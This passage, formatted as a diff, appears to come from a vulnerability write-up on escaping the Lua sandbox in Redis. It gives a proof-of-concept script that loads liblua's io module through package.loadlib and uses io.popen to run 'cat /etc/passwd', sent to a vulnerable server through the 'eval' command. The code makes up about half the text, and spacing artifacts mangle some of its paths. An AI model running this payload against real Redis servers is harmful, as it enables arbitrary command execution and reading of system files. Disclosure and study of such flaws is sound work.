@@ -1,0 +1,7 @@
+
+For instance, we can use “ package.loadlib” to load the modules from “ liblua ” library, then use this module to execute commands.
+The following is a proof of concept on how to exploit this vulnerability.
+local io_l = package.loadlib (\"/ usr /lib/
+x86_64-linux-gnu/liblua5.1.so.0\", \" luaopen_io \" ); local io = io_l ();
+local f = io.popen
+(\" cat / etc /passwd \", \"r\"); local res = f:read(\"*a\"); f:close(); return res To demonstrate this attack, we instantiated a vulnerable Redis server and launched the above Lua scripts using the “ eval ” command.
